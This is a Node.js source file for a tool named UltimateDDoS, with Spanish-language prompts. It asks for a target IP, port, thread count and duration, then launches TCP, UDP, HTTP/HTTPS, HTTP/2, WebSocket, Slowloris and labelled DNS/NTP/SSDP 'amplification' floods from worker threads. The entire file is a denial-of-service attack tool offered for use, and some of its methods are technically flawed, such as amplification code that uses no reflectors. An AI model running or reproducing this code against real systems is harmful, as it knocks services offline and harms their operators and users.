#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');

const ATTACK_METHODS = {
    TCP: 'TCP Flood',
    UDP: 'UDP Flood', 
    HTTP: 'HTTP Flood',
    HTTPS: 'HTTPS Flood',
    HTTP2: 'HTTP/2 Flood',
    WEBSOCKET: 'WebSocket Flood',
    SLOWLORIS: 'Slowloris',
    DNS: 'DNS Amplification',
    NTP: 'NTP Amplification',
    SSDP: 'SSDP Amplification'
};

class UltimateDDoS {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            startTime: 0
        };
        
        this.config = {
            payloads: {},
            workers: [],
            animation: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
            maxThreads: 2000,
            maxDuration: 1800
        };
        
        this.running = false;
    }

    async initialize() {
        this.target = await this._question(chalk.greenBright('IP objetivo: '));
        this.port = parseInt(await this._question(chalk.greenBright('Puerto objetivo: ')));
        
        const hilos = await this._question(
            chalk.greenBright(`Hilos (1-${this.config.maxThreads}): `)
        );
        this.threads = Math.min(parseInt(hilos, 10) || 500, this.config.maxThreads);
        
        const duracion = await this._question(
            chalk.greenBright(`Duración (1-${this.config.maxDuration}s): `)
        );
        this.duration = Math.min(parseInt(duracion, 10) || 60, this.config.maxDuration);
        
        const methodsInput = await this._question(
            chalk.greenBright('Métodos (separar por comas):\n') + 
            chalk.yellow(Object.values(ATTACK_METHODS).join('\n')) + '\n' +
            chalk.greenBright('Presiona Enter para usar todos: ')
        );
        
        this.methods = methodsInput ? 
            methodsInput.split(',').map(m => m.trim().toUpperCase()) : 
            Object.keys(ATTACK_METHODS);
        
        this._generatePayloads();
    }

    _question(prompt) {
        return new Promise(resolve => {
            const rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            
            rl.question(prompt, answer => {
                rl.close();
                resolve(answer);
            });
        });
    }

    _generatePayloads() {
        this.config.payloads = {
            tcp: this._createPayload(1024),
            udp: this._createPayload(65507),
            http: this._createHttpHeaders(),
            dns: this._createDnsQuery(),
            ntp: this._createNtpPacket(),
            ssdp: this._createSsdpRequest()
        };
    }

    _createPayload(size) {
        const buf = Buffer.alloc(size);
        randomFillSync(buf);
        return buf;
    }

    _createHttpHeaders() {
        return [
            'GET /' + randomBytes(8).toString('hex') + ' HTTP/1.1',
            'Host: ' + this.target,
            'User-Agent: ' + this._randomUserAgent(),
            'Accept: */*',
            'Connection: keep-alive',
            'X-Forwarded-For: ' + this._randomIp(),
            '\r\n'
        ].join('\r\n');
    }

    _randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10; SM-A205U)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    _randomIp() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
    }

    _createDnsQuery() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([
            0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain),
            0x00, 0x00, 0x01, 0x00, 0x01
        ]);
    }

    _createNtpPacket() {
        const packet = Buffer.alloc(48);
        packet[0] = 0x1B;
        return packet;
    }

    _createSsdpRequest() {
        return Buffer.from(
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 1\r\n' +
            'ST: ssdp:all\r\n' +
            '\r\n'
        );
    }

    async start() {
        if (this.running) return;
        this.running = true;
        this.stats.startTime = performance.now();
        
        console.log(chalk.greenBright('\n[+] Iniciando ataque...'));
        this._startWorkers();
        this._showStats();
        
        setTimeout(() => this.stop(), this.duration * 1000);
    }

    _startWorkers() {
        const cpuCores = require('os').cpus().length;
        const threadsPerWorker = Math.ceil(this.threads / cpuCores);

        for (let i = 0; i < cpuCores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target: this.target,
                    port: this.port,
                    methods: this.methods,
                    payloads: this.config.payloads,
                    threads: threadsPerWorker
                }
            });

            worker.on('message', msg => this._updateStats(msg));
            this.config.workers.push(worker);
        }
    }

    _executeAttack(target, port, methods, payloads, threads) {
        const attackMethods = {
            'TCP': () => this._tcpFlood(target, port, payloads),
            'UDP': () => this._udpFlood(target, port, payloads),
            'HTTP': () => this._httpFlood(target, port, payloads),
            'HTTPS': () => this._httpsFlood(target, port, payloads),
            'HTTP2': () => this._http2Flood(target, port),
            'WEBSOCKET': () => this._websocketFlood(target, port, payloads),
            'SLOWLORIS': () => this._slowloris(target, port),
            'DNS': () => this._dnsAmplification(target, port, payloads),
            'NTP': () => this._ntpAmplification(target, port, payloads),
            'SSDP': () => this._ssdpAmplification(target, port, payloads)
        };

        methods.forEach(method => {
            for (let i = 0; i < threads; i++) {
                if (attackMethods[method]) attackMethods[method]();
            }
        });
    }

    _tcpFlood(target, port, payloads) {
        const socket = new net.Socket();
        socket.connect(port, target, () => {
            socket.write(payloads.tcp);
            this._report('success', payloads.tcp.length);
            socket.destroy();
        }).on('error', () => this._report('failed', 0));
    }

    _udpFlood(target, port, payloads) {
        const socket = dgram.createSocket('udp4');
        socket.send(payloads.udp, port, target, err => {
            err ? this._report('failed', 0) : this._report('success', payloads.udp.length);
            socket.close();
        });
    }

    _httpFlood(target, port, payloads) {
        const req = http.request(`http://${target}:${port}`, {
            method: 'GET',
            headers: payloads.http
        }, res => {
            res.on('data', d => this._report('success', d.length));
            res.on('end', () => this._report('success', 0));
        }).on('error', () => this._report('failed', 0)).end();
    }

    _httpsFlood(target, port, payloads) {
        const req = https.request(`https://${target}:${port}`, {
            method: 'POST',
            headers: { 'Content-Length': payloads.tcp.length },
            rejectUnauthorized: false
        }, res => {
            res.on('data', d => this._report('success', d.length));
        }).on('error', () => this._report('failed', 0)).end(payloads.tcp);
    }

    _http2Flood(target, port) {
        const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
        const req = client.request({ ':path': `/?${randomBytes(8).toString('hex')}` });
        req.on('data', d => this._report('success', d.length));
        req.on('end', () => this._report('success', 0));
        req.end();
    }

    _websocketFlood(target, port, payloads) {
        const ws = new WebSocket(`ws://${target}:${port}`);
        ws.on('open', () => {
            ws.send(payloads.tcp);
            this._report('success', payloads.tcp.length);
            ws.close();
        }).on('error', () => this._report('failed', 0));
    }

    _slowloris(target, port) {
        const socket = net.connect(port, target);
        socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`);
        const timer = setInterval(() => {
            socket.write(`X-${randomBytes(4).toString('hex')}: ${Math.random()}\r\n`);
        }, 15000);
        socket.on('error', () => {
            clearInterval(timer);
            this._report('failed', 0);
        });
    }

    _dnsAmplification(target, port, payloads) {
        const socket = dgram.createSocket('udp4');
        socket.send(payloads.dns, port, target, err => {
            err ? this._report('failed', 0) : this._report('success', payloads.dns.length);
            socket.close();
        });
    }

    _ntpAmplification(target, port, payloads) {
        const socket = dgram.createSocket('udp4');
        socket.send(payloads.ntp, port, target, err => {
            err ? this._report('failed', 0) : this._report('success', payloads.ntp.length);
            socket.close();
        });
    }

    _ssdpAmplification(target, port, payloads) {
        const socket = dgram.createSocket('udp4');
        socket.send(payloads.ssdp, port, target, err => {
            err ? this._report('failed', 0) : this._report('success', payloads.ssdp.length);
            socket.close();
        });
    }

    _report(type, bytes) {
        const stats = {
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bandwidth: bytes
        };
        
        if (isMainThread) {
            this._updateStats(stats);
        } else {
            parentPort.postMessage(stats);
        }
    }

    _updateStats(msg) {
        this.stats.total += msg.total;
        this.stats.success += msg.success;
        this.stats.failed += msg.failed;
        this.stats.bandwidth += msg.bandwidth;
    }

    _showStats() {
        if (!this.running) return;
        
        const elapsed = (performance.now() - this.stats.startTime) / 1000;
        const anim = this.config.animation[Math.floor(elapsed * 10) % this.config.animation.length];
        const rps = (this.stats.total / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / (1024 ** 3)).toFixed(3);

        process.stdout.write(chalk`\r{green ${anim}} ` +
            chalk`{white Tiempo:} {greenBright ${elapsed.toFixed(1)}s} ` +
            chalk`{white Solicitudes:} {cyan ${this.stats.total}} ` +
            chalk`{white SPS:} {cyan ${rps}} ` +
            chalk`{white BW:} {cyan ${bw}GB} ` +
            chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`
        );

        setTimeout(() => this._showStats(), 100);
    }

    stop() {
        if (!this.running) return;
        
        this.running = false;
        this.config.workers.forEach(w => w.terminate());
        console.log(chalk`\n\n{yellow [!] Ataque finalizado}\n`);
        process.exit();
    }
}

if (isMainThread) {
    const ddos = new UltimateDDoS();
    
    ddos.initialize().then(() => {
        ddos.start();
        
        process.stdin.on('data', data => {
            if (data.toString().trim().toLowerCase() === 'stop') {
                ddos.stop();
            }
        });
    });
} else {
    const attack = new UltimateDDoS();
    attack._executeAttack(
        workerData.target,
        workerData.port,
        workerData.methods,
        workerData.payloads,
        workerData.threads
    );
}